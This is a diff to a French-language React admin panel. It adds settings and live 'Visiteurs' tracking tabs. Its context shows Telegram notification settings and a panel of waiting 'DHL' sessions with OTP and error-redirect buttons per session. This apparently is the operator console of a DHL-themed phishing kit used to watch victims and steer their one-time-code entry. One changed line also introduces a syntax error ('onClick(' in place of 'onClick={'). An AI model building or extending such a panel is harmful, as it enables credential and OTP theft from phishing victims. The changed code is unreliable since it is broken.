@@ -5,9 +5,10 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Button } from "@/components/ui/button";
 import { useToast } from "@/hooks/use-toast";
-import { Send, Save, CheckCircle2, Users, ExternalLink, XCircle, Shield } from "lucide-react";
+import { Send, Save, CheckCircle2, Users, ExternalLink, XCircle, Shield, Eye } from "lucide-react";
 import { apiRequest, queryClient } from "@/lib/queryClient";
 import { Switch } from "@/components/ui/switch";
+import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import VisitorTracking from "./VisitorTracking";
 
 interface TelegramConfig {
@@ -113,12 +114,25 @@ export default function AdminPanel({ onSave, onTest }: AdminPanelProps) {
   return (
     <div className="space-y-6 p-6">
       <div>
-        <h1 className="text-3xl font-bold" data-testid="text-admin-title">Configuration Admin</h1>
+        <h1 className="text-3xl font-bold" data-testid="text-admin-title">Panneau d'Administration</h1>
         <p className="text-muted-foreground mt-1">
-          Gérez les paramètres de notification Telegram
+          Gérez vos paramètres et surveillez vos visiteurs en temps réel
         </p>
       </div>
 
+      <Tabs defaultValue="settings" className="w-full">
+        <TabsList className="grid w-full max-w-md grid-cols-2">
+          <TabsTrigger value="settings" data-testid="tab-settings">
+            <Shield className="h-4 w-4 mr-2" />
+            Paramètres
+          </TabsTrigger>
+          <TabsTrigger value="visitors" data-testid="tab-visitors">
+            <Eye className="h-4 w-4 mr-2" />
+            Visiteurs
+          </TabsTrigger>
+        </TabsList>
+
+        <TabsContent value="settings" className="space-y-6 mt-6">
       <Card>
         <CardHeader>
           <CardTitle>Intégration Telegram</CardTitle>
@@ -666,7 +680,7 @@ function WaitingDHLSessionsPanel() {
                       OTP
                     </Button>
                     <Button
-                      onClick={() => handleRedirect(session.sessionId, '/error')}
+                      onClick(() => handleRedirect(session.sessionId, '/error')}
                       className="flex-1 bg-red-600 hover:bg-red-700"
                       data-testid={`button-dhl-error-${session.sessionId}`}
                       variant="destructive"
@@ -682,5 +696,12 @@ function WaitingDHLSessionsPanel() {
         </div>
       </CardContent>
     </Card>
+        </TabsContent>
+
+        <TabsContent value="visitors" className="mt-6">
+          <VisitorTracking />
+        </TabsContent>
+      </Tabs>
+    </div>
   );
 }
